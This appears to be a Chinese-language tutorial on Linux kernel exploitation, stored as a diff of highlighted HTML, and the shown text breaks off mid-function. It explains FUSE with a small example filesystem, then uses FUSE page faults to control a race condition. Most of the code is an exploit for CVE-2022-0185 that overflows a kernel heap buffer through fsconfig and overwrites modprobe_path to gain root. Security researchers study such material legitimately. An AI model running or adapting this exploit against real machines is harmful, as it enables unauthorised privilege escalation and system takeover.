+</span><span style="color:#c0c5ce;">             size_t size, off_t off, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*flock) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> op);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*fallocate) (</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">, off_t, off_t,
+</span><span style="color:#c0c5ce;">              </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *);
+</span><span style="color:#c0c5ce;">};
+</span></pre>
+<p>使用示例：
+先装<code>libfuse-dev</code></p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">// gcc fuse.c -o test -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">FUSE_USE_VERSION </span><span style="color:#d08770;">29
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">errno.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fuse.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">msg</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(msg);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static const char </span><span style="color:#c0c5ce;">*content = &quot;</span><span style="color:#a3be8c;">Hello, World!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">getattr_callback</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> stat *</span><span style="color:#bf616a;">stbuf</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] getattr_callback</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(stbuf, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> stat));
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(path, &quot;</span><span style="color:#a3be8c;">/file</span><span style="color:#c0c5ce;">&quot;) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">        stbuf-&gt;st_mode = S_IFREG | </span><span style="color:#d08770;">0777</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        stbuf-&gt;st_nlink = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        stbuf-&gt;st_size = </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(content);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-ENOENT;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">open_callback</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *</span><span style="color:#bf616a;">fi</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] open_callback</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">read_callback</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">                         </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">buf</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">, off_t </span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">                         </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *</span><span style="color:#bf616a;">fi</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] read_callback</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(path, &quot;</span><span style="color:#a3be8c;">/file</span><span style="color:#c0c5ce;">&quot;) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">        size_t len = </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(content);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(offset &gt;= len)
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((size &gt; len) || (offset + size &gt; len)) {
+</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(buf, content + offset, len - offset);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> len - offset;
+</span><span style="color:#c0c5ce;">        } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(buf, content + offset, size);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> size;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-ENOENT;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static struct</span><span style="color:#c0c5ce;"> fuse_operations fops = {
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">getattr </span><span style="color:#c0c5ce;">= getattr_callback,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">open </span><span style="color:#c0c5ce;">= open_callback,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">read </span><span style="color:#c0c5ce;">= read_callback,
+</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">/*
+</span><span style="color:#65737e;">int main(int argc, char *argv[]) {
+</span><span style="color:#65737e;">  return fuse_main(argc, argv, &amp;fops, NULL);
+</span><span style="color:#65737e;">}
+</span><span style="color:#65737e;">*/
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">() {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_args args = </span><span style="color:#8fa1b3;">FUSE_ARGS_INIT</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_chan *chan;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse *fuse;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!(chan = </span><span style="color:#8fa1b3;">fuse_mount</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/tmp/test</span><span style="color:#c0c5ce;">&quot;, &amp;args)))
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">fuse_mount</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!(fuse = </span><span style="color:#8fa1b3;">fuse_new</span><span style="color:#c0c5ce;">(chan, &amp;args, &amp;fops, sizeof(fops), </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">))) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fuse_unmount</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/tmp/test</span><span style="color:#c0c5ce;">&quot;, chan);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">fuse_new</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">fuse_set_signal_handlers</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">fuse_get_session</span><span style="color:#c0c5ce;">(fuse));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">fuse_loop_mt</span><span style="color:#c0c5ce;">(fuse);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">fuse_unmount</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/tmp/test</span><span style="color:#c0c5ce;">&quot;, chan);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>访问时 触发回调</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">ayoung@ay:~/Desktop/uos/qemu$ cat /tmp/test/file
+</span><span style="color:#c0c5ce;">Hello, World!
+</span></pre>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">ayoung@ay:~/how2keap$ ./test 
+</span><span style="color:#c0c5ce;">[+] getattr_callback
+</span><span style="color:#c0c5ce;">[+] getattr_callback
+</span><span style="color:#c0c5ce;">[+] open_callback
+</span><span style="color:#c0c5ce;">[+] read_callback
+</span></pre>
+<p>UAF read和UAF write触发的都是FUSE <code>read_callback</code>，不需要<code>write_callback</code>。因为fuse callback发生在文件访问过程中，并不是内存页的访问过程。从引发缺页异常到FUSE callback处理，对文件来说，都是首先被读到内存页中</p>
+<p>下图表示利用FUSE实现的竞态逻辑控制到UAF read阶段（某个例题）
+如果用FUSE实现的文件在mmap中没有<code>MAP_POPULATE</code>（用<code>MAP_ANONYMOUS</code>）的情况下映射到内存中，那么在读写该区域的时候就会出现缺页，最终会调用read callback
+利用这个和userfaultfd的时候一样，在内存读写发生的定时切换上下文（mmap映射fuse文件到内存，写过去的时候触发缺页）</p>
+<p><img src="./images/Pasted%20image%2020240823003708.png" alt="" /></p>
+<h3 id="shi-yong-fang-fa-1">使用方法1</h3><p>以CVE-2022-0185利用为例，这个例子里漏洞发生的系统调用是<code>fsconfig</code> 中的 <code>FSCONFIG_SET_STRING</code> 操作选项</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">do_win</span><span style="color:#c0c5ce;">() 
+</span><span style="color:#c0c5ce;">{   
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> size = </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buffer[</span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">] = {</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> pat[</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">] = {</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">    msg* message = (msg*)buffer;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(buffer, </span><span style="color:#d08770;">0x44</span><span style="color:#c0c5ce;">, sizeof(buffer));
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*evil_page = </span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)</span><span style="color:#d08770;">0x1337000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    uint64_t race_page = </span><span style="color:#d08770;">0x1338000</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    msg *rooter = (msg *)(race_page-</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    rooter-&gt;mtype = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    size = </span><span style="color:#d08770;">0x1010</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> target = </span><span style="color:#8fa1b3;">make_queue</span><span style="color:#c0c5ce;">(IPC_PRIVATE, </span><span style="color:#d08770;">0666 </span><span style="color:#c0c5ce;">| IPC_CREAT);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">send_msg</span><span style="color:#c0c5ce;">(target, message, size - </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Opening ext4 filesystem</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    fd = </span><span style="color:#8fa1b3;">fsopen</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">ext4</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) 
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Opening</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Overflowing...</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">strcpy</span><span style="color:#c0c5ce;">(pat, &quot;</span><span style="color:#a3be8c;">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">117</span><span style="color:#c0c5ce;">; i++) 
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fsconfig</span><span style="color:#c0c5ce;">(fd, FSCONFIG_SET_STRING, &quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot;, pat, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Prepaing fault handlers via FUSE</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> evil_fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">evil/evil</span><span style="color:#c0c5ce;">&quot;, O_RDWR);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(evil_fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">evil fd failed</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((</span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)</span><span style="color:#d08770;">0x1338000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, evil_fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)) != (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)</span><span style="color:#d08770;">0x1338000</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">mmap fail fuse 1</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    pthread_t thread;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> race = </span><span style="color:#8fa1b3;">pthread_create</span><span style="color:#c0c5ce;">(&amp;thread, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, arb_write, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(race != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">can&#39;t setup threads for race</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">send_msg</span><span style="color:#c0c5ce;">(target, rooter, size - </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pthread_join</span><span style="color:#c0c5ce;">(thread, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">munmap</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)</span><span style="color:#d08770;">0x1337000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">munmap</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)</span><span style="color:#d08770;">0x1338000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(evil_fd);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(fd);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">arb_write</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">args</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    uint64_t goal = modprobe_path - </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> pat[</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">] = {</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(pat, </span><span style="color:#d08770;">0x41</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">29</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> evil[</span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(evil, (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;goal, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">fsconfig</span><span style="color:#c0c5ce;">(fd, FSCONFIG_SET_STRING, &quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot;, pat, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">fsconfig</span><span style="color:#c0c5ce;">(fd, FSCONFIG_SET_STRING, &quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot;, evil, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Done heap overflow</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(fuse_pipes[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], &quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">evil_read</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">buf</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">, off_t </span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">              </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *</span><span style="color:#bf616a;">fi</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{   
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// change to modprobe_path
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> signal;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> evil_buffer[</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(evil_buffer, </span><span style="color:#d08770;">0x43</span><span style="color:#c0c5ce;">, sizeof(evil_buffer));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*evil = modprobe_win;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)(evil_buffer + </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">), evil, sizeof(evil));
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    size_t len = </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(offset &gt;= len)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> size;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(offset + size &gt; len)
+</span><span style="color:#c0c5ce;">        size = len - offset;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(buf, evil_buffer + offset, size);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// sync with the arb write thread
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(fuse_pipes[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], &amp;signal, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
